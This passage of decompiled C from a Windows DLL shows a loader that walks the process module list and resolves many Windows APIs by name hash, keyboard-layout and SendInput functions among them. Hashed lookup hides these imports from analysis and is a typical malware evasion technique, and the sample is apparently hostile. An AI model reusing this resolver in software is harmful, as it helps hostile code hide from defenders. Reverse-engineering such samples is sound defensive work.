// 1000B33C: using guessed type int (__stdcall *dword_1000B33C)(_DWORD, _DWORD, _DWORD);

//----- (10003943) --------------------------------------------------------
int __cdecl sub_10003943(int a1)
{
  return dword_1000B338(dword_1000B2F8, 8, a1);
}
// 1000B338: using guessed type int (__stdcall *dword_1000B338)(_DWORD, _DWORD, _DWORD);

//----- (10003956) --------------------------------------------------------
void *__usercall sub_10003956<eax>(int a1<ebx>, void *a2, char a3, unsigned int a4)
{
  int i; // ecx@2
  int v5; // edi@2
  int v6; // eax@2

  if ( a4 )
  {
    LOBYTE(a1) = a3;
    BYTE1(a1) = a3;
    v6 = a1 << 16;
    LOWORD(v6) = a1;
    memset(a2, v6, 4 * (a4 >> 2));
    v5 = (int)((char *)a2 + 4 * (a4 >> 2));
    for ( i = a4 & 3; i; --i )
      *(_BYTE *)v5++ = a3;
  }
  return a2;
}

//----- (10003989) --------------------------------------------------------
int __cdecl sub_10003989(int a1)
{
  int result; // eax@1

  result = 0;
  if ( *(_BYTE *)a1 )
  {
    do
      ++result;
    while ( *(_BYTE *)(result + a1) );
  }
  return result;
}

//----- (1000399B) --------------------------------------------------------
int __cdecl sub_1000399B(int a1, int a2)
{
  int v2; // edx@1
  int v3; // esi@1
  int v4; // eax@2
  int v5; // eax@5
  unsigned __int16 v6; // cx@5

  v2 = a1;
  v3 = a2;
  do
  {
    v4 = *(_WORD *)v2;
    if ( (_WORD)v4 >= 0x41u )
    {
      if ( (_WORD)v4 <= 0x5Au )
        v4 += 32;
    }
    v6 = v4;
    v5 = *(_WORD *)v3;
    if ( (_WORD)v5 >= 0x41u )
    {
      if ( (_WORD)v5 <= 0x5Au )
        v5 += 32;
    }
    v2 += 2;
    v3 += 2;
  }
  while ( v6 && v6 == (_WORD)v5 );
  return v6 - (unsigned __int16)v5;
}

//----- (100039E6) --------------------------------------------------------
int __cdecl sub_100039E6(int a1, int a2)
{
  int v2; // edx@1
  int v3; // esi@1
  char v4; // al@2
  char v5; // al@5
  char v6; // cl@5

  v2 = a1;
  v3 = a2;
  do
  {
    v4 = *(_BYTE *)v2;
    if ( *(_BYTE *)v2 >= 65 )
    {
      if ( v4 <= 90 )
        v4 += 32;
    }
    v6 = v4;
    v5 = *(_BYTE *)v3;
    if ( *(_BYTE *)v3 >= 65 )
    {
      if ( v5 <= 90 )
        v5 += 32;
    }
    ++v2;
    ++v3;
  }
  while ( v6 && v6 == v5 );
  return v6 - v5;
}

//----- (10003A1D) --------------------------------------------------------
int __cdecl sub_10003A1D(int a1, int a2, unsigned int a3)
{
  unsigned int v3; // edi@1
  int v4; // edx@2
  char v5; // al@3
  char v6; // cl@6
  int result; // eax@11

  v3 = 0;
  if ( a3 )
  {
    v4 = a2;
    while ( 1 )
    {
      v5 = *(_BYTE *)(a1 - a2 + v4);
      if ( v5 >= 65 )
      {
        if ( v5 <= 90 )
          v5 += 32;
      }
      v6 = *(_BYTE *)v4;
      if ( *(_BYTE *)v4 >= 65 )
      {
        if ( v6 <= 90 )
          v6 += 32;
      }
      if ( v5 != v6 )
        break;
      ++v3;
      ++v4;
      if ( v3 >= a3 )
        goto LABEL_11;
    }
    result = 2 * (v5 >= v6) - 1;
  }
  else
  {
LABEL_11:
    result = 0;
  }
  return result;
}

//----- (10003A6D) --------------------------------------------------------
int __cdecl sub_10003A6D(int a1)
{
  int v1; // edi@1
  int v2; // esi@1
  int result; // eax@2
  int v4; // eax@4
  int v5; // ebx@4
  unsigned int v6; // [sp+8h] [bp-4h]@1

  v6 = 0;
  v2 = *(_DWORD *)(sub_1000382A() + 12) + 12;
  v1 = *(_DWORD *)v2;
  if ( a1 )
  {
    do
    {
      if ( v1 != v2 )
      {
        ++v6;
        v4 = v1;
        v5 = *(_DWORD *)(v1 + 24);
        v1 = *(_DWORD *)v1;
        if ( v5 )
        {
          if ( v6 <= 0xC8 )
            continue;
        }
      }
      return 0;
    }
    while ( sub_1000399B(*(_DWORD *)(v4 + 48), a1) );
    result = v5;
  }
  else
  {
    result = *(_DWORD *)(v1 + 24);
  }
  return result;
}

//----- (10003AC9) --------------------------------------------------------
int __cdecl sub_10003AC9(int a1, signed int a2)
{
  int v2; // eax@1
  int v3; // ecx@1
  int v4; // eax@3
  int v5; // esi@4
  int v6; // eax@5
  int v7; // ebx@5
  int v8; // edi@5
  int v9; // esi@5
  unsigned int v10; // eax@8
  int v11; // edx@18
  unsigned int i; // esi@19
  int v13; // eax@19
  int v14; // edx@19
  int v15; // eax@23
  int v16; // edx@23
  int v17; // ebx@24
  signed int v18; // eax@25
  char v20; // [sp+Ch] [bp-30h]@1
  char v21[31]; // [sp+Dh] [bp-2Fh]@1
  __int16 v22; // [sp+29h] [bp-13h]@1
  char v23; // [sp+2Bh] [bp-11h]@1
  int v24; // [sp+2Ch] [bp-10h]@4
  int v25; // [sp+30h] [bp-Ch]@5
  int v26; // [sp+34h] [bp-8h]@1
  unsigned int v27; // [sp+38h] [bp-4h]@9

  v26 = 0;
  v20 = 0;
  memset(v21, 0, 0x1Cu);
  v3 = a1;
  v22 = 0;
  v23 = 0;
  v2 = a1;
  if ( a1 )
  {
LABEL_2:
    if ( *(_WORD *)v2 == 23117 )
    {
      v4 = *(_DWORD *)(v2 + 60) + v3 + 24;
      if ( *(_WORD *)v4 == 267 )
      {
        v5 = *(_DWORD *)(v4 + 96);
        v24 = *(_DWORD *)(v4 + 100);
        if ( v5 )
        {
          v9 = v3 + v5;
          v8 = v3 + *(_DWORD *)(v9 + 32);
          v6 = v3 + *(_DWORD *)(v9 + 28);
          v7 = v3 + *(_DWORD *)(v9 + 36);
          v25 = v3 + *(_DWORD *)(v9 + 28);
          if ( v8 )
          {
            if ( v7 )
            {
              if ( v6 )
              {
                v10 = *(_DWORD *)(v9 + 24);
                if ( v10 <= 0x186A0 )
                {
                  v27 = 0;
                  if ( v10 )
                  {
                    while ( sub_10003841(v3 + *(_DWORD *)(v8 + 4 * v27)) != a2 )
                    {
                      ++v27;
                      if ( v27 >= *(_DWORD *)(v9 + 24) )
                        goto LABEL_16;
                      v3 = a1;
                    }
                    v26 = a1 + *(_DWORD *)(v25 + 4 * *(_WORD *)(v7 + 2 * v27));
                  }
LABEL_16:
                  if ( v26 < (unsigned int)v9 || v26 >= (unsigned int)(v9 + v24) )
                    return v26;
                  if ( (unsigned int)sub_10003989(v26) < 0x20 )
                  {
                    v13 = sub_10003989(v11);
                    sub_10003907((int)&v20, v14, v13);
                    for ( i = 0; i < 0x20; ++i )
                    {
                      if ( *(&v20 + i) == 46 )
                      {
                        *(&v20 + i) = 0;
                        v15 = sub_10003989((int)"ntdll");
                        if ( !sub_10003A1D((int)&v20, v16, v15) )
                        {
                          v17 = sub_10003A6D((int)L"ntdll.dll");
                          if ( v17 )
                          {
                            v18 = sub_10003841((int)&v21[i]);
                            v26 = 0;
                            a2 = v18;
                            v20 = 0;
                            memset(v21, 0, 0x1Cu);
                            v22 = 0;
                            v23 = 0;
                            a1 = v17;
                            v2 = v17;
                            v3 = v17;
                            goto LABEL_2;
                          }
                        }
                        return 0;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
// 100053A4: using guessed type wchar_t aNtdll_dll[10];
// 10003AC9: using guessed type char var_2F[31];

//----- (10003C57) --------------------------------------------------------
signed int __cdecl sub_10003C57(int a1, unsigned int a2, int a3)
{
  signed int result; // eax@2
  unsigned int v4; // edx@6
  unsigned int v5; // eax@8
  int v6; // edx@8
  signed int v7; // [sp-8h] [bp-Ch]@4

  if ( !a1 )
    return 22;
  if ( !a3 )
  {
    v7 = 22;
LABEL_5:
    result = v7;
    *(_BYTE *)a1 = 0;
    return result;
  }
  v4 = sub_1000387A(a1, a2);
  if ( v4 == a2 || (v5 = sub_1000387A(a3, a2 - v4), v5 + v6 == a2) )
  {
    v7 = 34;
    goto LABEL_5;
  }
  sub_10003907(a1 + v6, a3, v5 + 1);
  return 0;
}

//----- (10003CB8) --------------------------------------------------------
signed int __cdecl sub_10003CB8()
{
  int v0; // esi@1
  signed int result; // eax@2
  signed int v2; // eax@3
  signed int v3; // eax@5
  signed int v4; // eax@7
  signed int v5; // eax@9
  signed int v6; // eax@11
  signed int v7; // eax@13
  signed int v8; // eax@15
  signed int v9; // eax@17
  signed int v10; // eax@19
  signed int v11; // eax@21
  signed int v12; // eax@23
  signed int v13; // eax@25
  signed int v14; // eax@27
  signed int v15; // eax@29
  signed int v16; // eax@31
  signed int v17; // eax@33
  signed int v18; // eax@35
  signed int v19; // eax@37
  signed int v20; // eax@39
  signed int v21; // eax@41
  signed int v22; // eax@43
  signed int v23; // eax@45
  signed int v24; // eax@47
  signed int v25; // eax@49
  signed int v26; // eax@51
  signed int v27; // eax@53
  signed int v28; // eax@55
  signed int v29; // eax@57
  signed int v30; // eax@59
  signed int v31; // eax@61
  signed int v32; // eax@63
  signed int v33; // eax@65
  signed int v34; // eax@67
  signed int v35; // eax@69
  signed int v36; // eax@71
  signed int v37; // eax@73
  signed int v38; // eax@75
  int v39; // esi@77
  signed int v40; // eax@79
  signed int v41; // eax@81
  signed int v42; // eax@83
  signed int v43; // eax@85
  signed int v44; // eax@87
  signed int v45; // eax@89
  signed int v46; // eax@91
  signed int v47; // eax@93
  signed int v48; // eax@95
  signed int v49; // eax@97
  signed int v50; // eax@99
  signed int v51; // eax@101
  signed int v52; // eax@103
  signed int v53; // eax@105
  signed int v54; // eax@107
  signed int v55; // eax@109
  signed int v56; // eax@111
  int v57; // esi@113
  signed int v58; // eax@115
  signed int v59; // eax@117
  signed int v60; // eax@119
  signed int v61; // eax@121
  signed int v62; // eax@123
  signed int v63; // eax@125
  signed int v64; // eax@127
  signed int v65; // eax@129
  signed int v66; // eax@131
  signed int v67; // eax@133
  signed int v68; // eax@135
  signed int v69; // eax@137
  signed int v70; // eax@139
  signed int v71; // eax@141
  signed int v72; // eax@143
  signed int v73; // eax@145
  signed int v74; // eax@147
  signed int v75; // eax@149
  signed int v76; // eax@151
  signed int v77; // eax@153
  signed int v78; // eax@155
  int v79; // esi@157
  signed int v80; // eax@159

  sub_10003956(328, &dword_1000B2E8, 0, 0x148u);
  dword_1000B2F4 = sub_10003A6D((int)L"ntdll.dll");
  dword_1000B2E8 = sub_10003A6D((int)L"kernel32.dll");
  dword_1000B2EC = sub_10003A6D((int)L"user32.dll");
  v0 = dword_1000B2E8;
  dword_1000B2F0 = sub_10003A6D((int)L"advapi32.dll");
  if ( dword_1000B2E8 )
  {
    v2 = sub_10003841((int)"VirtualAlloc");
    dword_1000B2FC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(v0, v2);
    if ( dword_1000B2FC )
    {
      v3 = sub_10003841((int)"VirtualFree");
      dword_1000B300 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v3);
      if ( dword_1000B300 )
      {
        v4 = sub_10003841((int)"VirtualQuery");
        dword_1000B304 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v4);
        if ( dword_1000B304 )
        {
          v5 = sub_10003841((int)"CreateFileA");
          dword_1000B308 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v5);
          if ( dword_1000B308 )
          {
            v6 = sub_10003841((int)"CreateFileW");
            dword_1000B30C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v6);
            if ( dword_1000B30C )
            {
              v7 = sub_10003841((int)"DeleteFileA");
              dword_1000B310 = sub_10003AC9(dword_1000B2E8, v7);
              if ( dword_1000B310 )
              {
                v8 = sub_10003841((int)"DeleteFileW");
                dword_1000B314 = (int (__thiscall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v8);
                if ( dword_1000B314 )
                {
                  v9 = sub_10003841((int)"CloseHandle");
                  dword_1000B320 = (int (__stdcall *)(_DWORD))sub_10003AC9(dword_1000B2E8, v9);
                  if ( dword_1000B320 )
                  {
                    v10 = sub_10003841((int)"ReadFile");
                    dword_1000B318 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(
                                                                                                  dword_1000B2E8,
                                                                                                  v10);
                    if ( dword_1000B318 )
                    {
                      v11 = sub_10003841((int)"WriteFile");
                      dword_1000B31C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(
                                                                                                    dword_1000B2E8,
                                                                                                    v11);
                      if ( dword_1000B31C )
                      {
                        v12 = sub_10003841((int)"GetFileSize");
                        dword_1000B324 = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v12);
                        if ( dword_1000B324 )
                        {
                          v13 = sub_10003841((int)"GetLastError");
                          dword_1000B328 = sub_10003AC9(dword_1000B2E8, v13);
                          if ( dword_1000B328 )
                          {
                            v14 = sub_10003841((int)"GetProcessHeap");
                            dword_1000B32C = (int (*)(void))sub_10003AC9(dword_1000B2E8, v14);
                            if ( dword_1000B32C )
                            {
                              v15 = sub_10003841((int)"GetSystemDirectoryA");
                              dword_1000B344 = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v15);
                              if ( dword_1000B344 )
                              {
                                v16 = sub_10003841((int)"GetSystemDirectoryW");
                                dword_1000B348 = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v16);
                                if ( dword_1000B348 )
                                {
                                  v17 = sub_10003841((int)"GetTempPathA");
                                  dword_1000B34C = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v17);
                                  if ( dword_1000B34C )
                                  {
                                    v18 = sub_10003841((int)"GetTempPathW");
                                    dword_1000B350 = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(
                                                                                          dword_1000B2E8,
                                                                                          v18);
                                    if ( dword_1000B350 )
                                    {
                                      v19 = sub_10003841((int)"GetTempFileNameA");
                                      dword_1000B37C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v19);
                                      if ( dword_1000B37C )
                                      {
                                        v20 = sub_10003841((int)"GetWindowsDirectoryW");
                                        dword_1000B354 = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(
                                                                                              dword_1000B2E8,
                                                                                              v20);
                                        if ( dword_1000B354 )
                                        {
                                          v21 = sub_10003841((int)"HeapCreate");
                                          dword_1000B330 = sub_10003AC9(dword_1000B2E8, v21);
                                          if ( dword_1000B330 )
                                          {
                                            v22 = sub_10003841((int)"HeapDestroy");
                                            dword_1000B334 = sub_10003AC9(dword_1000B2E8, v22);
                                            if ( dword_1000B334 )
                                            {
                                              v23 = sub_10003841((int)"HeapAlloc");
                                              dword_1000B338 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v23);
                                              if ( dword_1000B338 )
                                              {
                                                v24 = sub_10003841((int)"HeapFree");
                                                dword_1000B33C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v24);
                                                if ( dword_1000B33C )
                                                {
                                                  v25 = sub_10003841((int)"GetCurrentProcess");
                                                  dword_1000B340 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v25);
                                                  if ( dword_1000B340 )
                                                  {
                                                    v26 = sub_10003841((int)"Sleep");
                                                    dword_1000B358 = (int (__stdcall *)(_DWORD))sub_10003AC9(
                                                                                                  dword_1000B2E8,
                                                                                                  v26);
                                                    if ( dword_1000B358 )
                                                    {
                                                      v27 = sub_10003841((int)"CreateEventA");
                                                      dword_1000B35C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v27);
                                                      if ( dword_1000B35C )
                                                      {
                                                        v28 = sub_10003841((int)"OpenEventA");
                                                        dword_1000B360 = sub_10003AC9(dword_1000B2E8, v28);
                                                        if ( dword_1000B360 )
                                                        {
                                                          v29 = sub_10003841((int)"SetEvent");
                                                          dword_1000B364 = (int (__thiscall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v29);
                                                          if ( dword_1000B364 )
                                                          {
                                                            v30 = sub_10003841((int)"WaitForSingleObject");
                                                            dword_1000B368 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v30);
                                                            if ( dword_1000B368 )
                                                            {
                                                              v31 = sub_10003841((int)"CreateFileMappingW");
                                                              dword_1000B370 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v31);
                                                              if ( dword_1000B370 )
                                                              {
                                                                v32 = sub_10003841((int)"MapViewOfFile");
                                                                dword_1000B374 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2E8, v32);
                                                                if ( dword_1000B374 )
                                                                {
                                                                  v33 = sub_10003841((int)"UnmapViewOfFile");
                                                                  dword_1000B378 = (int (__stdcall *)(_DWORD))sub_10003AC9(dword_1000B2E8, v33);
                                                                  if ( dword_1000B378 )
                                                                  {
                                                                    v34 = sub_10003841((int)"CreateThread");
                                                                    dword_1000B380 = sub_10003AC9(dword_1000B2E8, v34);
                                                                    if ( dword_1000B380 )
                                                                    {
                                                                      v35 = sub_10003841((int)"ExitThread");
                                                                      dword_1000B384 = sub_10003AC9(dword_1000B2E8, v35);
                                                                      if ( dword_1000B384 )
                                                                      {
                                                                        v36 = sub_10003841((int)"ResumeThread");
                                                                        dword_1000B388 = sub_10003AC9(
                                                                                           dword_1000B2E8,
                                                                                           v36);
                                                                        if ( dword_1000B388 )
                                                                        {
                                                                          v37 = sub_10003841((int)"GetCurrentThreadId");
                                                                          dword_1000B38C = sub_10003AC9(
                                                                                             dword_1000B2E8,
                                                                                             v37);
                                                                          if ( dword_1000B38C )
                                                                          {
                                                                            v38 = sub_10003841((int)"GetCurrentProcessId");
                                                                            dword_1000B390 = (int (*)(void))sub_10003AC9(dword_1000B2E8, v38);
                                                                            if ( dword_1000B390 )
                                                                            {
                                                                              v39 = dword_1000B2F4;
                                                                              if ( dword_1000B2F4 )
                                                                              {
                                                                                v40 = sub_10003841((int)"NtAllocateVirtualMemory");
                                                                                dword_1000B3E8 = (int (__stdcall *)(_DWORD))sub_10003AC9(v39, v40);
                                                                                if ( dword_1000B3E8 )
                                                                                {
                                                                                  v41 = sub_10003841((int)"NtFreeVirtualMemory");
                                                                                  dword_1000B3EC = sub_10003AC9(
                                                                                                     dword_1000B2F4,
                                                                                                     v41);
                                                                                  if ( dword_1000B3EC )
                                                                                  {
                                                                                    v42 = sub_10003841((int)"RtlInitUnicodeString");
                                                                                    dword_1000B3F4 = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v42);
                                                                                    if ( dword_1000B3F4 )
                                                                                    {
                                                                                      v43 = sub_10003841((int)"RtlInitAnsiString");
                                                                                      dword_1000B3F0 = sub_10003AC9(dword_1000B2F4, v43);
                                                                                      if ( dword_1000B3F0 )
                                                                                      {
                                                                                        v44 = sub_10003841((int)"RtlUnicodeStringToAnsiString");
                                                                                        dword_1000B3FC = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v44);
                                                                                        if ( dword_1000B3FC )
                                                                                        {
                                                                                          v45 = sub_10003841((int)"RtlUnicodeStringToInteger");
                                                                                          dword_1000B3F8 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v45);
                                                                                          if ( dword_1000B3F8 )
                                                                                          {
                                                                                            v46 = sub_10003841((int)"strcpy");
                                                                                            dword_1000B400 = (int (__cdecl *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v46);
                                                                                            if ( dword_1000B400 )
                                                                                            {
                                                                                              v47 = sub_10003841((int)"swprintf");
                                                                                              dword_1000B404 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v47);
                                                                                              if ( dword_1000B404 )
                                                                                              {
                                                                                                v48 = sub_10003841((int)"wcscpy");
                                                                                                dword_1000B408 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v48);
                                                                                                if ( dword_1000B408 )
                                                                                                {
                                                                                                  v49 = sub_10003841((int)"wcslen");
                                                                                                  dword_1000B40C = (int (__cdecl *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v49);
                                                                                                  if ( dword_1000B40C )
                                                                                                  {
                                                                                                    v50 = sub_10003841((int)"wcscat");
                                                                                                    dword_1000B410 = (int (__cdecl *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v50);
                                                                                                    if ( dword_1000B410 )
                                                                                                    {
                                                                                                      v51 = sub_10003841((int)"_itow");
                                                                                                      dword_1000B414 = (int (__thiscall *)(_DWORD))sub_10003AC9(dword_1000B2F4, v51);
                                                                                                      if ( dword_1000B414 )
                                                                                                      {
                                                                                                        v52 = sub_10003841((int)"NtClose");
                                                                                                        dword_1000B418 = (int (__stdcall *)(_DWORD))sub_10003AC9(dword_1000B2F4, v52);
                                                                                                        if ( dword_1000B418 )
                                                                                                        {
                                                                                                          v53 = sub_10003841((int)"NtOpenKey");
                                                                                                          dword_1000B41C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v53);
                                                                                                          if ( dword_1000B41C )
                                                                                                          {
                                                                                                            v54 = sub_10003841((int)"NtQueryValueKey");
                                                                                                            dword_1000B420 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v54);
                                                                                                            if ( dword_1000B420 )
                                                                                                            {
                                                                                                              v55 = sub_10003841((int)"NtEnumerateValueKey");
                                                                                                              dword_1000B424 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2F4, v55);
                                                                                                              if ( dword_1000B424 )
                                                                                                              {
                                                                                                                v56 = sub_10003841((int)"NtEnumerateKey");
                                                                                                                dword_1000B428 = sub_10003AC9(dword_1000B2F4, v56);
                                                                                                                if ( dword_1000B428 )
                                                                                                                {
                                                                                                                  v57 = dword_1000B2EC;
                                                                                                                  if ( dword_1000B2EC )
                                                                                                                  {
                                                                                                                    v58 = sub_10003841((int)"LoadKeyboardLayoutA");
                                                                                                                    dword_1000B39C = sub_10003AC9(v57, v58);
                                                                                                                    if ( dword_1000B39C )
                                                                                                                    {
                                                                                                                      v59 = sub_10003841((int)"LoadKeyboardLayoutW");
                                                                                                                      dword_1000B3A0 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2EC, v59);
                                                                                                                      if ( dword_1000B3A0 )
                                                                                                                      {
                                                                                                                        v60 = sub_10003841((int)"UnloadKeyboardLayout");
                                                                                                                        dword_1000B3A4 = sub_10003AC9(dword_1000B2EC, v60);
                                                                                                                        if ( dword_1000B3A4 )
                                                                                                                        {
                                                                                                                          v61 = sub_10003841((int)"GetKeyboardLayout");
                                                                                                                          dword_1000B394 = (int (__stdcall *)(_DWORD))sub_10003AC9(dword_1000B2EC, v61);
                                                                                                                          if ( dword_1000B394 )
                                                                                                                          {
                                                                                                                            v62 = sub_10003841((int)"GetKeyboardLayoutList");
                                                                                                                            dword_1000B398 = sub_10003AC9(dword_1000B2EC, v62);
                                                                                                                            if ( dword_1000B398 )
                                                                                                                            {
                                                                                                                              v63 = sub_10003841((int)"ActivateKeyboardLayout");
                                                                                                                              dword_1000B3A8 = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2EC, v63);
                                                                                                                              if ( dword_1000B3A8 )
                                                                                                                              {
                                                                                                                                v64 = sub_10003841((int)"SendInput");
                                                                                                                                dword_1000B3AC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_10003AC9(dword_1000B2EC, v64);
                                                                                                                                if ( dword_1000B3AC )
                                                                                                                                {
                                                                                                                                  v65 = sub_10003841((int)"KillTimer");
                                                                                                                                  dword_1000B3B0 = sub_10003AC9(dword_1000B2EC, v65);
                                                                                                                                  if ( dword_1000B3B0 )
                                                                                                                                  {
                                                                                                                                    v66 = sub_10003841((int)"GetForegroundWindow");
                                                                                                                                    dword_1000B3B4 = (int (*)(void))sub_10003AC9(dword_1000B2EC, v66);
                                                                                                                                    if ( dword_1000B3B4 )
                                                                                                                                    {
                                                                                                                                      v67 = sub_10003841((int)"GetWindowThreadProcessId");
                                                                                                                                      dword_1000B3B8 = (int (__stdcall *)(_DWORD, _DWORD))sub_10003AC9(dword_1000B2EC, v67);
                                                                                                                                      if ( dword_1000B3B8 )
                                                                                                                                      {
                                                                                                                                        v68 = sub_10003841((int)"CreateWindowExA");
                                                                                                                                        dword_1000B3BC = sub_10003AC9(dword_1000B2EC, v68);
                                                                                                                                        if ( dword_1000B3BC )
                                                                                                                                        {
                                                                                                                                          v69 = sub_10003841((int)"GetWindowLongA");
                                                                                                                                          dword_1000B3C0 = sub_10003AC9(dword_1000B2EC, v69);
                                                                                                                                          if ( dword_1000B3C0 )
                                                                                                                                          {
                                                                                                                                            v70 = sub_10003841((int)"SetWindowLongA");
                                                                                                                                            dword_1000B3C4 = sub_10003AC9(dword_1000B2EC, v70);
                                                                                                                                            if ( dword_1000B3C4 )
                                                                                                                                            {
                                                                                                                                              v71 = sub_10003841((int)"CallWindowProcA");
                                                                                                                                              dword_1000B3C8 = sub_10003AC9(dword_1000B2EC, v71);
                                                                                                                                              if ( dword_1000B3C8 )
                                                                                                                                              {
                                                                                                                                                v72 = sub_10003841((int)"GetMessageA");
                                                                                                                                                dword_1000B3CC = sub_10003AC9(dword_1000B2EC, v72);
                                                                                                                                                if ( dword_1000B3CC )
                                                                                                                                                {
                                                                                                                                                  v73 = sub_10003841((int)"TranslateMessage");
                                                                                                                                                  dword_1000B3D0 = sub_10003AC9(dword_1000B2EC, v73);
                                                                                                                                                  if ( dword_1000B3D0 )
                                                                                                                                                  {
                                                                                                                                                    v74 = sub_10003841((int)"DispatchMessageA");
                                                                                                                                                    dword_1000B3D4 = sub_10003AC9(dword_1000B2EC, v74);
                                                                                                                                                    if ( dword_1000B3D4 )
                                                                                                                                                    {
                                                                                                                                                      v75 = sub_10003841((int)"SendMessageA");
                                                                                                                                                      dword_1000B3D8 = sub_10003AC9(dword_1000B2EC, v75);
                                                                                                                                                      if ( dword_1000B3D8 )
                                                                                                                                                      {
                                                                                                                                                        v76 = sub_10003841((int)"PostMessageA");
                                                                                                                                                        dword_1000B3DC = sub_10003AC9(dword_1000B2EC, v76);
                                                                                                                                                        if ( dword_1000B3DC )
                                                                                                                                                        {
                                                                                                                                                          v77 = sub_10003841((int)"EnableWindow");
                                                                                                                                                          dword_1000B3E0 = sub_10003AC9(dword_1000B2EC, v77);
                                                                                                                                                          if ( dword_1000B3E0 )
                                                                                                                                                          {
                                                                                                                                                            v78 = sub_10003841((int)"PostQuitMessage");
                                                                                                                                                            dword_1000B3E4 = sub_10003AC9(dword_1000B2EC, v78);
                                                                                                                                                            if ( dword_1000B3E4 )
                                                                                                                                                            {
                                                                                                                                                              v79 = dword_1000B2F0;
                                                                                                                                                              if ( dword_1000B2F0 )
                                                                                                                                                              {
                                                                                                                                                                v80 = sub_10003841((int)"RegOpenKeyExW");
                                                                                                                                                                dword_1000B42C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_10003AC9(v79, v80);
                                                                                                                                                                if ( dword_1000B42C )
                                                                                                                                                                {
                                                                                                                                                                  dword_1000B2F8 = dword_1000B32C();
                                                                                                                                                                  if ( dword_1000B2F8 )
                                                                                                                                                                  {
                                                                                                                                                                    result = 1758003200;
                                                                                                                                                                  }
                                                                                                                                                                  else
                                                                                                                                                                  {
                                                                                                                                                                    sub_10003956(328, &dword_1000B2E8, 0, 0x148u);
                                                                                                                                                                    result = 1757675522;
                                                                                                                                                                  }
                                                                                                                                                                }
                                                                                                                                                                else
                                                                                                                                                                {
                                                                                                                                                                  result = 1759445077;
                                                                                                                                                                }
                                                                                                                                                              }
                                                                                                                                                              else
                                                                                                                                                              {
                                                                                                                                                                result = 1759249434;
                                                                                                                                                              }
                                                                                                                                                            }
                                                                                                                                                            else
                                                                                                                                                            {
                                                                                                                                                              result = 1758986325;
                                                                                                                                                            }
                                                                                                                                                          }
                                                                                                                                                          else
                                                                                                                                                          {
                                                                                                                                                            result = 1759051861;
                                                                                                                                                          }
                                                                                                                                                        }
                                                                                                                                                        else
                                                                                                                                                        {
                                                                                                                                                          result = 1758855253;
                                                                                                                                                        }
                                                                                                                                                      }
                                                                                                                                                      else
                                                                                                                                                      {
                                                                                                                                                        result = 1758920789;
                                                                                                                                                      }
                                                                                                                                                    }
                                                                                                                                                    else
                                                                                                                                                    {
                                                                                                                                                      result = 1758724181;
                                                                                                                                                    }
                                                                                                                                                  }
                                                                                                                                                  else
                                                                                                                                                  {
                                                                                                                                                    result = 1758789717;
                                                                                                                                                  }
                                                                                                                                                }
                                                                                                                                                else
                                                                                                                                                {
                                                                                                                                                  result = 1758593109;
                                                                                                                                                }
                                                                                                                                              }
                                                                                                                                              else
                                                                                                                                              {
                                                                                                                                                result = 1758658645;
                                                                                                                                              }
                                                                                                                                            }
                                                                                                                                            else
                                                                                                                                            {
                                                                                                                                              result = 1758462037;
                                                                                                                                            }
                                                                                                                                          }
